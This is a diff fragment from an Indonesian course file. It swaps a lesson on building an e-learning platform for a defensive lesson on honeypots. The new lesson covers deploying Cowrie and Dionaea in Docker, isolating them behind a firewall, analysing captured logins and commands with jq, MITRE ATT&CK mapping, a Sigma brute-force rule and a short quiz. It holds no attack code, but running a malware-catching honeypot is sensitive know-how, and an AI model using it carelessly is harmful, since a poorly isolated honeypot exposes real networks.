-### 4. Student Learning Interface (3-4 hari)
-\`\`\`jsx
-function MaterialPage({ material }) {
-  const [progress, setProgress] = useState(null);
-  
-  return (
-    <div>
-      {/* Sidebar: list materi per level */}
-      <Sidebar level={material.level} current={material.order} />
-      
-      {/* Konten materi */}
-      <article>
-        <ReactMarkdown 
-          rehypePlugins={[rehypeHighlight]}
-        >
-          {material.konten}
-        </ReactMarkdown>
-        
-        {/* Quiz */}
-        <Quiz 
-          questions={material.quiz} 
-          onComplete={(score) => saveProgress(material._id, score)} 
-        />
-        
-        {/* Navigasi */}
-        <NavButton prev={prevMaterial} next={nextMaterial} />
-      </article>
-    </div>
-  );
-}
+# Cowrie menyimpan log di:
+# var/log/cowrie/cowrie.json
+# var/lib/cowrie/tty/*.log (sesi terminal)
 \`\`\`
 
-### 5. Interactive Code Editor (3-4 hari)
-- Integrate Monaco Editor
-- Execute kode user via Judge0/Piston API
-- Show output real-time
-- Save & submit kode
-\`\`\`javascript
-// Backend: execute kode user
-app.post("/api/run", async (req, res) => {
-  const { kode, bahasa } = req.body;
-  
-  // Kirim ke Judge0 API
-  const response = await axios.post("https://judge0.com/submissions", {
-    source_code: kode,
-    language_id: getLanguageId(bahasa)
-  });
-  
-  // Polling hasil
-  const result = await pollResult(response.data.token);
-  res.json({ output: result.stdout, error: result.stderr });
-});
+## Dionaea — Malware Catcher
+
+\`\`\`bash
+# Dionaea mensimulasikan SMB, FTP, HTTP, MSSQL
+docker run -d -p 21:21 -p 445:445 -p 1433:1433 \\
+  -v /var/dionaea:/var/dionaea \\
+  dinotools/dionaea:latest
+
+# Menerima exploit & menangkap sample malware
+# Sample disimpan di /var/dionaea/binaries/
 \`\`\`
 
-### 6. Progress Tracking & Gamification (2-3 hari)
-- Track materi completed
-- Hitung XP & level
-- Unlock materi berikutnya setelah quiz lulus
-- Achievement badges (first quiz, streak 7 hari, dll)
-- Leaderboard weekly/monthly
+## Arsitektur Aman
 
-### 7. Quiz System (2 hari)
-- Multiple choice dengan auto-grading
-- Tracking skor per materi
-- Minimal skor untuk lanjut (misal 70%)
-- Retry quiz
-- Explanation setelah submit
+\`\`\`text
+[Internet] --> [Firewall] --> [Honeypot Network isolated]
+                                |
+                                +--> Cowrie (SSH)
+                                +--> Dionaea (SMB)
+                                +--> Conpot (ICS)
+                                +--> ElasticSearch (log)
 
-### 8. Forum Diskusi (2-3 hari)
-- Thread per materi
-- Reply & like
-- Markdown support
-- Moderasi by instructor
-- Notification reply
-
-### 9. Sertifikat & Achievement (2 hari)
-- Generate sertifikat PDF setelah selesai level
-- Unique certificate ID
-- Share ke LinkedIn
-- Badge system visual
-
-### 10. Admin Dashboard (2-3 hari)
-- Statistik: total student, completion rate
-- Manajemen user & role
-- Approve materi dari instructor
-- Analytics per level (dropout point)
-
-## Tantangan Lanjutan
-
-- **Live coding session** (WebSocket real-time)
-- **AI tutor** (chatbot bantu jawab pertanyaan)
-- **Pair programming** feature
-- **Code review** peer-to-peer
-- **Career path** (learning path terstruktur)
-- **Premium content** (subscription)
-- **Mobile app** (React Native)
-- **Multi-language** materi
-
-## Contoh: Progress Tracking Logic
-
-\`\`\`javascript
-// Saat student selesai quiz
-async function completeQuiz(userId, materialId, score) {
-  // Simpan progress
-  await UserProgress.findOneAndUpdate(
-    { user: userId, material: materialId },
-    { completed: true, quizScore: score, completedAt: new Date() },
-    { upsert: true }
-  );
-  
-  // Tambah XP
-  const xp = score >= 70 ? 100 : 50;
-  await User.findByIdAndUpdate(userId, { $inc: { xp } });
-  
-  // Cek achievement
-  const totalCompleted = await UserProgress.countDocuments({ 
-    user: userId, completed: true 
-  });
-  if (totalCompleted === 1) {
-    await User.findByIdAndUpdate(userId, { $push: { badges: "first_quiz" } });
-    // Notifikasi
-  }
-  
-  // Unlock materi berikutnya
-  const material = await Material.findById(materialId);
-  const nextMaterial = await Material.findOne({
-    level: material.level,
-    order: material.order + 1
-  });
-  return { xp, nextMaterial };
-}
+PENTING:
+- Honeypot TIDAK boleh bisa dipakai melompat ke jaringan internal
+- Firewall hanya izinkan OUTBOUND ke logging server
+- Disable forwarding ke internal
+- Monitor resource (penyerang bisa pakai untuk DDoS)
 \`\`\`
 
-## Tips Sukses
+## Analisis & TTP Extraction
 
-- **Konten adalah raja**: pastikan materi berkualitas & akurat
-- **UX adalah kunci**: progress yang jelas, feedback instan
-- **Performance**: caching materi, lazy load code editor
-- **Gamification**: jadikan belajar menyenangkan dengan XP, badge, leaderboard
-- **Komunitas**: forum diskusi penting untuk retention
+\`\`\`bash
+# Analyze cowrie log
+jq 'select(.eventid=="cowrie.login.success")' cowrie.json | jq '.username,.password'
+jq 'select(.eventid=="cowrie.command.input")' cowrie.json | jq '.input'
 
-> **Hasil Akhir:** Platform e-learning yang interaktif dan engaging akan menjadi showcase terbaik skill kamu. Plus, kamu membantu orang lain belajar coding!`,
+# Top credentials digunakan
+jq -r '.username + ":" + .password' cowrie.json | sort | uniq -c | sort -rn | head
+
+# MITRE ATT&CK mapping dari command yang dijalankan
+# whoami     → T1033 System Owner Discovery
+# ipconfig   → T1016 System Network Config Discovery
+# wget/mkdir → T1105 Ingress Tool Transfer
+\`\`\`
+
+## Visualisasi & Sharing
+
+\`\`\`bash
+# Kirim log ke ELK / Splunk untuk dashboard
+# - Peta asal serangan (GeoIP)
+# - Tren serangan per jam/hari
+# - TTP heatmap
+# - Sample malware baru
+
+# Share IoC ke threat intel community
+# - MISP
+# - AbuseIPDB
+# - VirusTotal (hash sample)
+\`\`\`
+
+## Deliverables
+
+\`\`\`text
+1. Honeypot aktif (minimal Cowrie + Dionaea)
+2. Dashboard visualisasi serangan
+3. Laporan analisis 1 bulan (TTP, IoC, tren)
+4. Sample malware yang tertangkap + analisis ringkas
+5. MITRE ATT&CK mapping dari observasi
+6. Sharing IoC ke minimal 1 platform (MISP/AbuseIPDB)
+7. Dokumentasi deployment & hardening
+8. Rekomendasi detection rule untuk SOC (Sigma rule)
+\`\`\`
+
+\`\`\`yaml
+# Contoh Sigma rule hasil honeypot
+title: Cowrie Honeypot SSH Brute Force Source
+logsource:
+  product: cowrie
+detection:
+  selection:
+    eventid: cowrie.login.failed
+  condition: selection | count(username) by src_ip > 10
+fields:
+  - src_ip
+  - username
+level: medium
+\`\`\`
+
+> Honeypot memberi intelijen yang tidak bisa didapat dari tools defensif biasa — melihat penyerang di alam liar. Pastikan deployment aman, log terkumpul, dan temuan dibagikan kembali ke komunitas.`,
     quiz: [
       {
-        question: "Mengapa platform belajar coding perlu code editor interaktif?",
-        options: [
-          "Agar tampil lebih keren",
-          "Student bisa langsung praktik dan lihat output kode mereka",
-          "Untuk menghemat server",
-          "Menggantikan backend"
-        ],
+        question: "Apa tujuan utama honeypot?",
+        options: ["Backup data", "Menarik & menganalisis serangan penyerang", "Antivirus", "Web server"],
         answer: 1,
-        explanation: "Belajar coding paling efektif dengan praktik. Code editor interaktif memungkinkan student menulis kode dan langsung melihat hasilnya—belajar by doing."
+        explanation: "Honeypot adalah sistem yang sengaja dibuat rentan untuk menarik penyerang dan merekam aktivitas mereka untuk analisis."
       },
       {
-        question: "Apa manfaat gamification (XP, badge, leaderboard) di platform belajar?",
-        options: [
-          "Mempercepat server",
-          "Meningkatkan motivasi dan retention student",
-          "Menggantikan sistem nilai",
-          "Untuk analytics"
-        ],
-        answer: 1,
-        explanation: "Gamification (XP, achievement, leaderboard) memicu motivasi intrinsik dan ekstrinsik, membuat student lebih engaged dan cenderung lanjut belajar (retention tinggi)."
+        question: "Honeypot SSH/Telnet open-source populer?",
+        options: ["Cowrie", "Burp Suite", "Nessus", "Wireshark"],
+        answer: 0,
+        explanation: "Cowrie adalah honeypot medium-interaction untuk SSH dan Telnet yang populer di komunitas riset."
       },
       {
-        question: "Bagaimana cara menentukan student bisa lanjut ke materi berikutnya?",
-        options: [
-          "Selalu bisa lanjut langsung",
-          "Lewat quiz dengan minimal skor tertentu (misal 70%)",
-          "Setelah membaca materi 3 kali",
-          "Acak"
-        ],
+        question: "Yang harus diperhatikan saat deploy honeypot?",
+        options: ["Akses internet cepat", "Isolasi agar tidak dipakai lompat ke jaringan internal", "RAM besar", "GPU kencang"],
         answer: 1,
-        explanation: "Quiz dengan minimal skor memastikan student benar-benar paham materi sebelum lanjut. Ini menjaga kualitas pembelajaran dan mencegah student tertinggal di materi advanced."
+        explanation: "Honeypot harus diisolasi — penyerang yang mengkompromi honeypot tidak boleh bisa melompat ke jaringan internal produksi."
       }
     ]
   }
